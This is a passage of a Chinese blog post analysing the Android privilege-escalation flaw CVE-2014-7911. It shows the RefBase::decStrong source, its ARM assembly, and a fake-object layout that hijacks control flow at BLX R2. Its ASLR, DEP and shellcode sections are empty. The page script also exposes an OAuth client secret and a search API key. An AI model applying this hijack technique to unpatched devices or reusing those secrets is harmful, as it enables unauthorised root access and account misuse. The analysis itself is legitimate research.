<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 攻击这个方法</span></span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>汇编整体如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_assembly.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_assembly.png"></p>
<p><strong>注意一点，decStrong的汇编代码有两个参数，一个是this指针（我们可控），一个是void*的地址</strong></p>
<p><strong>refs对象内部有4个局部变量，分别叫mStrong、mWeak、mBase、mFlags。无虚函数，因此mStrong的地址就是refs的地址，mBase = refs+8</strong></p>
<p>分开来看：</p>
<p>1、</p>
<blockquote>
<p>weakref_impl* const refs = mRefs;<br>refs-&gt;removeStrongRef(id);<br>const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</p>
</blockquote>
<p><strong>对应的汇编为：</strong></p>
<blockquote>
<p> LDR             R4, [R0,#4]    ; R0是this指针，我们可控，根据内存布局可知，R0+4指向mRefs<br> MOV             R6, R1        ; R1是参数id。refs-&gt;removeStrongRef(id)在代码里是空实现，</p>
<pre><code>; 因此被直接省略掉了
</code></pre><p>MOV             R0, R4        ; R0 = refs<br>BLX             android_atomic_dec    ; 入参是refs-&gt;mStrong，因为refs没有实现类，</p>
<p>​                                ; 因此mStrong是它的第一个成员变量，mStrong的地址=refs</p>
</blockquote>
<p>2、 </p>
<blockquote>
<p>if (c == 1) {<br>    // 攻击这个方法<br>    refs-&gt;mBase-&gt;onLastStrongRef(id);<br>    if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {<br>        delete this;<br>    }<br>}</p>
</blockquote>
<p><strong>对应的汇编为：</strong></p>
<blockquote>
<p>.text:0000D180                 CMP             R0, #1        ; 将android_atomic_dec的值c与1进行比较<br>.text:0000D182                 BNE             loc_D19C<br>.text:0000D184                 LDR             R0, [R4,#8]   ; R4 = refs. r0 = refs+8 = refs-&gt;mBase<br>.text:0000D186                 MOV            R1, R6        ; R1 = R6 = id<br>.text:0000D188                 LDR             R3, [R0]<br>.text:0000D18A                 LDR             R2, [R3,#0xC] ; onLastStrongRef是mBase的虚函数，因此到</p>
<pre><code>mBase+0XC的位置取偏移，然后跳转
</code></pre><p>.text:0000D18C                 BLX             R2</p>
</blockquote>
<p>这里的BLX R2就是我们的攻击点。</p>
<p>所以我们要做的就是：构建Shellcode，让This指针指向头部从而控制R0（其实就是让mOrgue指向shellcode首部）。Shellcode头部+4的地方是mRefs，Shellcode+12的地方是mBase，Shellcode+12+0xC的地方就是最终的恶意代码攻击开始的地方。</p>
<p>需要注意的点：android_atomic_dec这个函数（检测引用计数的）会对参数进行减1操作并判断结果是否为0，如果为0，就表明该数没有其他地方在引用了，返回值为1.因此，我们需要将refs-&gt;mStrong的值设置为1</p>
<h4 id="因此，可写出如下的Shellcode："><a href="#因此，可写出如下的Shellcode：" class="headerlink" title="因此，可写出如下的Shellcode："></a>因此，可写出如下的Shellcode：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、绕过ALSR"><a href="#4、绕过ALSR" class="headerlink" title="4、绕过ALSR"></a>4、绕过ALSR</h3><blockquote>
<p>与其他操作系统一样，Android对ASLR机制的支持也是分阶段完成的，最早在<strong>4.0</strong>版本引入，仅仅实现了对<strong>栈</strong>和<strong>nmap</strong>系统调用所创建的区域（包括动态链接库）的随机化。在<strong>4.0.3</strong>实现了对<strong>堆</strong>空间的随机化，但是<strong>动态连接器(linker)</strong>本身的随机化并未实现，<strong>4.1.1</strong>为linker和所有其他的系统二进制文件进行了随机化，目前Android系统已经完全支持了ASLR机制。</p>
</blockquote>
<p>Android内的所有进程都fork自Zygote进程，</p>
<h3 id="5、绕过DEP"><a href="#5、绕过DEP" class="headerlink" title="5、绕过DEP"></a>5、绕过DEP</h3><h3 id="6、制作Shellcode，提权"><a href="#6、制作Shellcode，提权" class="headerlink" title="6、制作Shellcode，提权"></a>6、制作Shellcode，提权</h3><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ul>
<li><a href="https://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation/" target="_blank" rel="noopener">https://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation/</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></li>
<li><a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/retme7/CVE-2014-7911_poc</a></li>
</ul>

            

        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">TAGGED IN</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/Android/">Android</a> <a class="tag tag--primary tag--small t-link" href="/tags/CVE/">CVE</a> <a class="tag tag--primary tag--small t-link" href="/tags/Root/">Root</a> <a class="tag tag--primary tag--small t-link" href="/tags/专栏-提权/">专栏-提权</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2019/01/30/CTF_PWN1/" data-tooltip="CTF_PWN（一）" aria-label="PREVIOUS: CTF_PWN（一）">
                
                    <i class="fa fa-angle-left" aria-hidden="true"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                </a>
            </li>
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/01/RageAgainstTheCage/" data-tooltip="Android提权：RageAginstTheCage" aria-label="NEXT: Android提权：RageAginstTheCage">
                
                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                    <i class="fa fa-angle-right" aria-hidden="true"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Weibo">
                    <i class="fa fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/09/28/cve-2014-7911/&amp;title=Android系统提权：CVE-2014-7911" title="Share on QQ">
                    <i class="fa fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Qzone">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Renren">
                    <i class="fa fa-renren" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a class="post-action-btn btn btn--default" href="#gitment">
                         <i class="fa fa-comment-o"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
                <div id="gitment"></div>
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2019 CytQ. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2019/01/30/CTF_PWN1/" data-tooltip="CTF_PWN（一）" aria-label="PREVIOUS: CTF_PWN（一）">
                
                    <i class="fa fa-angle-left" aria-hidden="true"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                </a>
            </li>
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/01/RageAgainstTheCage/" data-tooltip="Android提权：RageAginstTheCage" aria-label="NEXT: Android提权：RageAginstTheCage">
                
                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                    <i class="fa fa-angle-right" aria-hidden="true"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Weibo">
                    <i class="fa fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/09/28/cve-2014-7911/&amp;title=Android系统提权：CVE-2014-7911" title="Share on QQ">
                    <i class="fa fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Qzone">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/09/28/cve-2014-7911/" title="Share on Renren">
                    <i class="fa fa-renren" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a class="post-action-btn btn btn--default" href="#gitment">
                         <i class="fa fa-comment-o"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                <div id="share-options-bar" class="share-options-bar" data-behavior="5">
    <i id="btn-close-shareoptions" class="fa fa-close"></i>
    <ul class="share-options">
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/09/28/cve-2014-7911/">
                    <i class="fa fa-weibo" aria-hidden="true"></i><span>Share on Weibo</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/09/28/cve-2014-7911/&amp;title=Android系统提权：CVE-2014-7911">
                    <i class="fa fa-qq" aria-hidden="true"></i><span>Share on QQ</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/09/28/cve-2014-7911/">
                    <i class="fa fa-star" aria-hidden="true"></i><span>Share on Qzone</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/09/28/cve-2014-7911/">
                    <i class="fa fa-renren" aria-hidden="true"></i><span>Share on Renren</span>
                </a>
            </li>
        
    </ul>
</div>

            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/headicon.png" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">CytQ</h4>
        
            <div id="about-card-bio"><p>Security Engineer<br>Android、移动安全、逆向、漏洞挖掘、渗透</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>17本，任职百度、滴滴</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                Beijing
            </div>
        
    </div>
</div>

        
            <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-close"></i></span>
            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    />
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">no post found</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/11/22/序言/">
                            <h3 class="media-heading">序言</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Nov 22, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/11/23/Volley-Lrucache-DiskLrucache/">
                            <h3 class="media-heading">三级缓存 + AndroidStudio导出jar包 + upload to github</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Nov 23, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>　　想了半天都没想出来写什么作为第一篇博客比较好，突然发现这次项目的版本控制是github，三级缓存和屏幕适配又是一个跑不掉的话题，就以这些话题开始我的博客之旅吧，同时总结一下在AndroidStudio中如何导出jar包。    </p>
<pre><code>([参考郭霖的blog](http://blog.csdn.net/guolin_blog/article/details/28863651))
([参考李晨玮的blog](http://www.cnblogs.com/lichenwei)/)

不管是提升用户体验还是提升APP的流畅度，三级缓存都是必不可少的，在这里就先总结一下三级缓存的使用。
</code></pre><p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/11/23/screensuit/">
                            <h3 class="media-heading">三种屏幕适配的方式</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Nov 23, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>​    第一篇博客总结了三级缓存／AndroidStudio打包jar包／上传基本文件到github,　第二篇就接着总结一下三种屏幕适配的方式。</p>
<p>在这里也推荐一下<a href="http://blog.csdn.net/lmj623565791?viewmode=contents" target="_blank" rel="noopener">张鸿洋</a>的博客，关注挺久了，和<a href="http://blog.csdn.net/guolin_blog" target="_blank" rel="noopener">郭霖</a>的都很好。</p>
<p>第一种方式，dimens中设置不同dp值，来达到适配的目的<br>第二种方式，利用第三方百分比库<br>第三种方式，利用第三方库：AutoLayout </p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/11/24/全局变量的处理/">
                            <h3 class="media-heading">全局变量的处理</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Nov 24, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>　　很多时候APP会莫名其妙的崩溃，尤其是一些配置很低的收集，重现场景就是在APP切换到后台后，闲置了一段时间后再继续使用时，就会崩溃。<br>　　导致上述崩溃发生的一个可能罪魁祸首就是全局变量，在内存不足的时候，系统会回收一部分闲置的资源，由于APP被切换到了后台，所以之前存放的全局变量很容易被回收，这是再切换到前台继续使用，在使用某个全局变量的时候，就会因为全局变量的值为空而崩溃。<br>　　要解决这个问题，就一定要使用序列化技术。</p>
<p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/11/25/Android自动填写验证码/">
                            <h3 class="media-heading">Android自动填写验证码</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Nov 25, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>　　第四篇博客就来总结下项目中使用到的一个提升用户体验的功能：　Android自动填写验证码<br>　　从字面上来看，很明显的可以看出它的实现流程：监听-&gt;有改变-&gt;获取信息-&gt;改变ui</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/12/01/引导页_视差显示/">
                            <h3 class="media-heading">引导页_视差显示</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Dec 1, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>当用户下载完APP后，第一次启动时通常会有一个引导页，而这个引导页对于引导用户或介绍本产品有着很好的作用。一般三种方式实现：</p>
<ol>
<li>Viewpager<br>这种方式很简单，易实现，但是在观赏性上来说很差，没有任何动画</li>
<li>视差显示<br>这种方式是基于ViewPager的，通过自定义其中的类，或者调整其中的方法来达到显示的效果。<br>　在ViewPager中，有一个接口叫做PageTransformer，其中有一个方法transformPage,我们通过在这个方法中编写逻辑就可以实现视差显示。而之所以叫做视差显示，是因为实现这种方式是对不同的控件设置不同的速度来达到的。例如，ViewPager移动了10dp,　图片A移动了15dp, 图片B移动了7.5dp，这就产生了一个视差。</li>
<li>Html5<br>这种方式也是最近使用得越来越多的方式，通过加载h5来实现引导页的炫目效果。</li>
</ol></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/12/01/手势/">
                            <h3 class="media-heading">手势</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Dec 1, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>这里介绍的只是一个简单的DEMO，根据官方的API还可以进行自定义手势的编写，具体的内容就以后遇到了再说，在本项目中也只起一个开后门的验证作用,毕竟一个没有后门的APP不是一个好APP。</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/12/07/Json数据的解析_Gson/">
                            <h3 class="media-heading">Json数据的解析_Gson</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Dec 7, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>一些简单的JSON格式解析可以直接使用JSONObject和JSONArray来解析，但是面对比较复杂或者是数据量较大的JSON数据时就需要使用fastJSON和Gson来解析了，这样的效率和效果都更好。</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/12/08/ViewPager取消预加载/">
                            <h3 class="media-heading">ViewPager取消预加载</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Dec 8, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>ViewPager在设计的时候有一个预加载的机制，也就是如果你处于当前这个page界面时,会预先加载下一个page。但是有的时候设计到网络请求，就需要取消掉这个预加载。</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://imlzq.com/2015/12/20/Note-&gt;Rxjava/">
                            <h3 class="media-heading">RxJava学习笔记</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Dec 20, 2015
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p>学习自扔物线的文章<a href="http://gank.io/post/560e15be2dca930e00da1083。" target="_blank" rel="noopener">http://gank.io/post/560e15be2dca930e00da1083。</a></p>
<p>粗略学习了最近越来越火的RxJava，进行一个简单的学习总结，这篇博客只涉及使用，不涉及原理</p>
<blockquote>
<p>Github：<br><a href="https://github.com/ReactiveX/RxJava" target="_blank" rel="noopener">https://github.com/ReactiveX/RxJava</a><br><a href="https://github.com/ReactiveX/RxAndroid" target="_blank" rel="noopener">https://github.com/ReactiveX/RxAndroid</a> </p>
</blockquote>
<p>使用方式:</p>
<blockquote>
<p>compile ‘io.reactivex:rxjava:1.0.14’<br>compile ‘io.reactivex:rxandroid:1.0.1’ </p>
</blockquote>
<p>我的相关博文：<br><a href="http://blog.csdn.net/jonstank2013/article/details/50574871" target="_blank" rel="noopener">RxJava使用示例（一）： 实现Rxbus代替eventbus</a><br><a href="http://blog.csdn.net/jonstank2013/article/details/50981404" target="_blank" rel="noopener">RxJava实现原理探索</a></p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="no post found"
                data-message-one="1 post found"
                data-message-other="{n} posts found">
                64 posts found
            </p>
        </div>
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-peofhqjkzcghmndknakluequy1y6owxdwpaqyju9ntl9zxnk7rdolb3rjjoj.min.js"></script>
<!--SCRIPTS END-->

    
        <script type="text/javascript">
            (function() {
                function render() {
                    new Gitment({
                        id: 'http://imlzq.com/2018/09/28/cve-2014-7911/',
                        owner: 'CytQ',
                        repo: 'BlogComments',
                        oauth: {
                            client_id: 'eddb24a604957d55b0fc',
                            client_secret: '5c1a27d80b9c1978faa1d488b34d606b77529b77',
                        }
                    }).render('gitment');
                }
                var gc = document.createElement('script');
                gc.type = 'text/javascript';
                gc.src = '//imsun.github.io/gitment/dist/gitment.browser.js';
                gc.charset = 'UTF-8';
                gc.onload = render;
                gc.async = true;
                document.querySelector('body').appendChild(gc);
                var gcs = document.createElement('link');
                gcs.href = '//imsun.github.io/gitment/style/default.css';
                gcs.type = 'text/css';
                gcs.rel = 'stylesheet';
                gcs.media = 'screen,print';
                document.querySelector('head').appendChild(gcs);
            })();
	    </script>
    


    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.14.1/moment-with-locales.min.js"></script>
    <script src="//cdn.jsdelivr.net/algoliasearch/3/algoliasearch.min.js"></script>
    <script>
        var algoliaClient = algoliasearch('S730SA64YT', '66519eebbcfbe3a23d50e47efa19798f');
        var algoliaIndex = algoliaClient.initIndex('Blog');
    </script>


    </body>
</html>
